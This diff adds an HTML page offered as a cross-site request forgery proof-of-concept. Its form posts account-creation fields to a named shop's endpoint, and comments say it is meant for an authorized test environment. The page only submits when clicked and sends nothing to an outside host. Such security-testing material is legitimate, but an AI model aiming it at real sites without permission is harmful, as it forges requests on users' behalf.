@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF PoC - Account Creation</title>
+</head>
+<body>
+  <h2>CSRF Account Creation Test</h2>
+
+  <!-- Replace with your authorized test environment URL -->
+  <form
+    action="https://sparkshop.com/account/create"
+    method="POST"
+    enctype="application/x-www-form-urlencoded"
+  >
+    <label>
+      Username:
+      <input
+        type="text"
+        name="username"
+        value="csrf-test-user"
+        required
+      >
+    </label>
+    <br><br>
+
+    <label>
+      Email:
+      <input
+        type="email"
+        name="email"
+        value="csrf-test@example.com"
+        required
+      >
+    </label>
+    <br><br>
+
+    <label>
+      Password:
+      <input
+        type="password"
+        name="password"
+        required
+      >
+    </label>
+    <br><br>
+
+    <label>
+      Repeat password:
+      <input
+        type="password"
+        name="password_confirmation"
+        required
+      >
+    </label>
+    <br><br>
+
+    <!-- Add any other required fields or CSRF token
+         observed in your authorized test environment. -->
+
+    <button type="submit">
+      Submit Test Request POC
+    </button>
+  </form>
+</body>
+</html>
